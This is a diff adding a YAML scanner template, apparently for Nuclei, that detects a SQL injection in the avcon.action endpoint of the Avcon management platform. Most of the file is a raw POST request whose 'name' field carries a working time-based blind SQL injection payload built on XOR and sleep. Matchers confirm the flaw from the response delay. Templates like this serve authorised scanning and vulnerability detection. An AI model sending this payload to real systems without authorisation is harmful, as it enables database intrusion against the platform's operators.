@@ -1,0 +1,29 @@
+id: poc-yaml-avcon-avcon-action-sqli
+info:
+  name: Avcon综合管理平台 avcon.action SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 1}}"
+http:
+  - raw:
+      - |
+        POST /avcon.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        name=0'XOR(if(now()=sysdate()%2Csleep({{t1}})%2C0))XOR'Z&password=u]H[ww6KrA9F.x-F
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "登录失败"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) && duration < to_number(t2)"
